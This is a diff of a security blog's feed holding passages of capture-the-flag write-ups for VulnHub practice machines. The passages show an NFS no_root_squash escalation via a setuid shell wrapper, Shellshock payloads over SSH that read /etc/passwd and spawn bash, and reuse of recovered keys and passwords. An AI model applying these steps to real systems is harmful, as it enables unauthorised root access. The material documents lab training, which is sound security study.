-    (root) NOPASSWD: /usr/local/sbin/nfs
-[/plain]</p>
 
 <p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/opt/nfs *<span class="o">(</span>rw,sync,crossmnt,no_subtree_check,no_root_squash
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>
 
@@ -401,81 +505,106 @@ Matching Defaults entries for john on this host:
 
 <p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
-root@kali:~# cd /mnt/nfs
-root@kali:/mnt/nfs# ls -la
-total 8
-drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
-drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
+</span><span class='line'>root@kali:~# <span class="nb">cd</span> /mnt/nfs
+</span><span class='line'>root@kali:/mnt/nfs# ls -la
+</span><span class='line'>total 8
+</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 03:43 .
+</span><span class='line'>drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Dec <span class="m">19</span> 13:09 ..
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>
 
 <p>The code for the C wrapper is pretty straight forward</p>
 
-<p>[c]
-int main(void)
-{
-        system(&ldquo;/bin/dash&rdquo;);
-}
-[/c]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:/mnt/nfs# gcc wrapper.c -m32
-root@kali:/mnt/nfs# chmod 4777 a.out
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/mnt/nfs# gcc wrapper.c -m32
+</span><span class='line'>root@kali:/mnt/nfs# chmod <span class="m">4777</span> a.out
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Which, when executed as user john, drops me to a root shell</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-john@pegasus:/opt/nfs$ ls -la
-ls -la
-total 32
-drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
-drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
--rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
-john@pegasus:/opt/nfs$ ./moo2
-./a.out</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 32
+</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Dec <span class="m">20</span> 00:17 .
+</span><span class='line'>drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 20:51 ..
+</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root root <span class="m">7160</span> Dec <span class="m">20</span> 00:17 a.out
+</span><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>./moo2
+</span><span class='line'>./a.out
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
+</span><span class='line'><span class="sb">``</span>
+</span><span class='line'>
+</span><span class='line'>Allowing the grail of grails... the ability to cat /root/flag
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>id</h1>
 
-<p>uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
-[/plain]</p>
-
-<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]</p>
+<p> bash</p>
 
 <h1>cat flag</h1>
 
-<p>cat flag
-               ,
-               |<code>\
-              /'_/_
-            ,'_/\_/\_                       ,
-          ,'_/\'_\_,/_                    ,'|
-        ,'_/\_'_ \_ \_/                _,-'_/
-      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
-    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
-   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
-    \_</code>> 6<code>7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
-     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
-      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
-        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
-      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
-     ( ) \_ \|_ </code>_    _,/&lsquo;\,<em>&rsquo;</em>,/&lsquo;               a video game system sold in
-      \<em>  __)    <code>\_                             Poland, Serbia and Bosnia.
-       \_)   &gt;       </code>_                           It was a hardware clone of
-            /  <code>,      |</code>_                         the Nintendo Famicom.
-           /    \     / \ <code>\
-          /   __/|   /  / </code>\
-         (<code> (   (</code> (</em>  \   /
+<pre><code>           ,
+           |`\
+          /'_/_
+        ,'_/\_/\_                       ,
+      ,'_/\'_\_,/_                    ,'|
+    ,'_/\_'_ \_ \_/                _,-'_/
+  ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
+,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
+</code></pre>
+
+<p>   ( (&lsquo; )\/(<em> _ \&rsquo;</em>,\   <strong>&ndash;&lsquo; <em>,-</em>/<em>,-&rsquo;,</em>/ <em>\      mythology. He is a winged
+    _<code>\&gt; 6</code> 7  \&lsquo;</em>,/ ,-&rsquo; <em>,-,&lsquo;\,</em>&rsquo;<em> \,</em>/&lsquo;<em>,\       stallion usually depicted
+     \/-  </em>/ 7 &rsquo;/ <em>,&lsquo; </em>/&rsquo;_  \,<em>&lsquo;</em> _ \&rsquo;<em>,/         as pure white in color.
+      _&lsquo;/>   7&rsquo;</em>/&lsquo; <em>/&rsquo; _ &lsquo;\,</em>&rsquo;<em> _ \&lsquo;</em>,\          Symbol of wisdom and fame.
+        >/  _ ,V  ,&lt;  _<em> &rsquo;\,</em>&lsquo;<em> _ \&rsquo;</em>,/
+      /&lsquo;<em>  ( )</em>)\/-,&rsquo;,</strong> &lsquo;\,<em>&rsquo;</em>,_,\&lsquo;<em>\             Fun fact: Pegasus was also
+     ( ) _ |</em>  <code>\_    \_,/'\,_'_,/'               a video game system sold in
+      \\_  \_\_)   </code>_                             Poland, Serbia and Bosnia.
+       _)   >        <code>\_                           It was a hardware clone of
+            / </code>,      |<code>\_                         the Nintendo Famicom.
+           /    \     / \</code>\
+          /   <strong>/|   /  /  <code>\
+         (</code>  (   (<code>(_  \   /
          /  ,/    |  /  /   \
-        / ,/      | /   \   `_
-      <em>/</em>/        |/    /<em><em>/,</em>/
+        / ,/      | /   \  </code>_
+      <em>/</em>/        |/    /</strong>/,<em>/
      /</em>(         /_(</p>
 
 <p>CONGRATULATIONS! You made it :)</p>
@@ -491,7 +620,7 @@ and leave some feedback, I would love to hear from you!</p>
 
 <p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
 more awesome boot2root VMs!
-[/plain]</p>
+&#8220;`</p>
 
 <p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
 ]]></content>
@@ -731,8 +860,8 @@ root@pwk:~#
 <p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#106;&#x61;&#115;&#111;&#x6e;&#64;&#49;&#55;&#50;&#46;&#49;&#x36;&#46;&#53;&#x36;&#x2e;&#x31;&#51;&#57;">&#x6a;&#97;&#115;&#x6f;&#x6e;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#x36;&#46;&#53;&#x36;&#x2e;&#49;&#x33;&#x39;</a>
-<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x61;&#x73;&#111;&#x6e;&#64;&#49;&#x37;&#x32;&#x2e;&#x31;&#x36;&#46;&#53;&#x36;&#x2e;&#x31;&#51;&#57;">&#x6a;&#x61;&#115;&#111;&#110;&#64;&#49;&#55;&#x32;&#46;&#49;&#x36;&#46;&#x35;&#54;&#46;&#49;&#51;&#57;</a>&rsquo;s password: jB9jP2knf
+root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#106;&#97;&#115;&#111;&#x6e;&#64;&#x31;&#x37;&#50;&#x2e;&#x31;&#x36;&#x2e;&#53;&#x36;&#x2e;&#x31;&#x33;&#57;">&#106;&#x61;&#115;&#111;&#110;&#64;&#x31;&#55;&#x32;&#46;&#x31;&#x36;&#46;&#x35;&#x36;&#46;&#49;&#x33;&#x39;</a>
+<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#106;&#x61;&#x73;&#x6f;&#110;&#x40;&#x31;&#55;&#x32;&#x2e;&#49;&#x36;&#46;&#x35;&#x36;&#x2e;&#49;&#51;&#x39;">&#x6a;&#97;&#x73;&#x6f;&#110;&#x40;&#49;&#55;&#x32;&#x2e;&#49;&#x36;&#x2e;&#53;&#54;&#x2e;&#49;&#x33;&#57;</a>&rsquo;s password: jB9jP2knf
 Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -1378,7 +1507,7 @@ login        login to shell with specified username and password</p>
 <p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#109;&#101;&#x40;&#109;&#x65;&#x2e;&#x63;&#x6f;&#109;">&#x6d;&#x65;&#x40;&#x6d;&#101;&#46;&#x63;&#x6f;&#x6d;</a>&rdquo;
+root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x6d;&#101;&#64;&#x6d;&#x65;&#46;&#99;&#x6f;&#x6d;">&#109;&#x65;&#x40;&#x6d;&#x65;&#x2e;&#99;&#111;&#x6d;</a>&rdquo;
 root@pwk:~# ./owlbin
 Content-type: text/plain</p>
 
@@ -1427,7 +1556,7 @@ uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(d
 <p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-$ ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#114;&#109;&#x70;&#64;&#x31;&#x37;&#50;&#x2e;&#49;&#x36;&#46;&#x35;&#54;&#x2e;&#49;&#x33;&#49;">&#x72;&#109;&#x70;&#x40;&#x31;&#55;&#50;&#46;&#49;&#x36;&#46;&#x35;&#54;&#x2e;&#x31;&#x33;&#49;</a>
+$ ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#114;&#x6d;&#x70;&#64;&#49;&#x37;&#x32;&#46;&#49;&#54;&#x2e;&#53;&#54;&#46;&#x31;&#51;&#49;">&#114;&#x6d;&#x70;&#x40;&#x31;&#x37;&#x32;&#46;&#49;&#x36;&#x2e;&#53;&#x36;&#x2e;&#49;&#x33;&#49;</a>
 The authenticity of host &lsquo;172.16.56.131 (172.16.56.131)&rsquo; can&rsquo;t be established.
 RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -1868,7 +1997,7 @@ zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
 <p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x6e;&#x6f;&#111;&#98;&#x40;&#49;&#55;&#x32;&#46;&#49;&#x36;&#46;&#x35;&#x36;&#x2e;&#x31;&#x33;&#x38;">&#x6e;&#111;&#x6f;&#x62;&#64;&#49;&#x37;&#50;&#46;&#49;&#x36;&#46;&#53;&#54;&#46;&#49;&#x33;&#x38;</a>
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#110;&#111;&#x6f;&#98;&#64;&#x31;&#x37;&#x32;&#x2e;&#x31;&#x36;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x33;&#56;">&#110;&#111;&#111;&#98;&#64;&#x31;&#x37;&#x32;&#x2e;&#49;&#54;&#x2e;&#53;&#x36;&#x2e;&#x31;&#x33;&#x38;</a>
 TRY HARDER LOL!
 Connection to 172.16.56.138 closed.
 root@pwk:~#
@@ -1877,7 +2006,7 @@ root@pwk:~#
 <p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x6e;&#111;&#x6f;&#98;&#x40;&#x31;&#x37;&#50;&#46;&#49;&#54;&#46;&#x35;&#x36;&#46;&#x31;&#51;&#x38;">&#x6e;&#x6f;&#x6f;&#98;&#64;&#49;&#x37;&#x32;&#46;&#49;&#x36;&#46;&#53;&#54;&#46;&#49;&#51;&#56;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
+root@pwk:~# ssh -i key.key <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#110;&#x6f;&#111;&#98;&#64;&#49;&#55;&#50;&#46;&#x31;&#x36;&#x2e;&#53;&#54;&#x2e;&#x31;&#x33;&#56;">&#x6e;&#111;&#x6f;&#98;&#x40;&#49;&#55;&#x32;&#46;&#49;&#54;&#46;&#53;&#54;&#x2e;&#49;&#x33;&#56;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -1910,7 +2039,7 @@ root@pwk:~#
 <p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x6e;&#x6f;&#111;&#x62;&#64;&#x31;&#55;&#x32;&#46;&#49;&#x36;&#46;&#x35;&#54;&#x2e;&#49;&#x33;&#x38;">&#110;&#x6f;&#x6f;&#98;&#x40;&#x31;&#x37;&#x32;&#x2e;&#x31;&#x36;&#46;&#x35;&#54;&#x2e;&#x31;&#x33;&#x38;</a> &lsquo;() { :;}; /bin/bash&rsquo;
+root@pwk:~# ssh -i key.key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x6e;&#111;&#x6f;&#98;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#x35;&#x36;&#x2e;&#x31;&#x33;&#x38;">&#110;&#x6f;&#x6f;&#98;&#64;&#x31;&#x37;&#50;&#x2e;&#49;&#54;&#x2e;&#53;&#x36;&#x2e;&#49;&#x33;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
 id
 uid=1002(noob) gid=1002(noob) groups=1002(noob)
 [/plain]</p>
@@ -2209,7 +2338,7 @@ OK: wut ?</p>
 <p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /> OK, so not knowing the password, I decided to check out SSH.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x62;&#x6c;&#97;&#104;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x30;&#46;&#49;&#x30;&#54;">&#98;&#108;&#x61;&#x68;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#49;&#x30;&#x36;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x62;&#108;&#x61;&#x68;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#x2e;&#49;&#48;&#x36;">&#x62;&#x6c;&#97;&#x68;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x30;&#46;&#49;&#48;&#54;</a></p>
 
 <p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
 \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
@@ -2318,7 +2447,7 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#98;&#x6c;&#x61;&#104;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#54;">&#98;&#x6c;&#97;&#104;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#x31;&#x30;&#54;</a>&rsquo;s password: [/plain]</p>
+<p><a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#x62;&#108;&#x61;&#x68;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#49;&#48;&#54;">&#x62;&#x6c;&#x61;&#x68;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#48;&#46;&#x31;&#48;&#54;</a>&rsquo;s password: [/plain]</p>
 
 <p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>
 
@@ -2695,7 +2824,7 @@ sqlite>
 <p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#x72;&#x6f;&#98;&#105;&#x6e;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#x31;&#48;&#x36;">&#114;&#111;&#x62;&#105;&#110;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#48;&#x2e;&#49;&#48;&#54;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x72;&#x6f;&#x62;&#x69;&#x6e;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#49;&#x30;&#54;">&#114;&#x6f;&#x62;&#105;&#110;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#48;&#x36;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -2705,10 +2834,10 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x72;&#111;&#x62;&#x69;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#49;&#48;&#x36;">&#114;&#111;&#x62;&#105;&#110;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#49;&#x30;&#x36;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
+<p><a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x72;&#111;&#x62;&#105;&#110;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#48;&#54;">&#x72;&#x6f;&#x62;&#x69;&#110;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#x30;&#46;&#49;&#48;&#54;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
 Permission denied, please try again.
-<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#114;&#x6f;&#x62;&#105;&#110;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#48;&#x2e;&#x31;&#x30;&#x36;">&#x72;&#x6f;&#x62;&#105;&#110;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#54;</a>&rsquo;s password: ^C
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#100;&#x65;&#x61;&#x6e;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x30;&#46;&#x31;&#48;&#x36;">&#100;&#x65;&#97;&#x6e;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x30;&#x2e;&#49;&#48;&#54;</a></p>
+<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x72;&#x6f;&#x62;&#x69;&#110;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x30;&#x2e;&#49;&#x30;&#x36;">&#x72;&#x6f;&#x62;&#105;&#x6e;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x30;&#x2e;&#49;&#x30;&#x36;</a>&rsquo;s password: ^C
+root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#100;&#101;&#97;&#x6e;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x30;&#46;&#x31;&#x30;&#x36;">&#x64;&#101;&#97;&#110;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#49;&#48;&#x36;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -2718,7 +2847,7 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x64;&#101;&#97;&#x6e;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#48;&#46;&#x31;&#x30;&#54;">&#100;&#101;&#x61;&#110;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#49;&#x30;&#x36;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
+<p><a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x64;&#101;&#x61;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#x2e;&#49;&#x30;&#x36;">&#100;&#101;&#97;&#110;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#48;&#x2e;&#49;&#x30;&#54;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
 Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>
 
 <ul>
@@ -2861,7 +2990,7 @@ dean@flick:~$ [/plain]</p>
 <p>[plain gutter=&ldquo;false&rdquo;]
 dean@flick:~$ ./read_docker ./ > robin.priv
 dean@flick:~$ chmod 600 ./robin.priv
-dean@flick:~$ ssh -i robin.priv <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#114;&#x6f;&#98;&#x69;&#110;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#114;&#111;&#98;&#105;&#110;&#64;&#49;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;</a></p>
+dean@flick:~$ ssh -i robin.priv <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#114;&#x6f;&#98;&#105;&#110;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#49;">&#114;&#111;&#x62;&#105;&#x6e;&#x40;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#46;&#x31;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -3626,7 +3755,7 @@ robin@flick:~$ /tmp/rootshell</p>
 <p>And for completeness, an SSH session as root.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#114;&#111;&#111;&#116;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x30;&#46;&#49;&#x30;&#x36;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x30;&#46;&#49;&#48;&#x36;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x72;&#111;&#x6f;&#116;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#x30;&#x2e;&#x31;&#x30;&#54;">&#114;&#111;&#x6f;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x30;&#46;&#49;&#x30;&#54;</a></p>
 
 <p> .o88o. oooo   o8o            oooo
  888 <code>"</code>888   <code>"'           </code>888
@@ -3864,7 +3993,7 @@ $
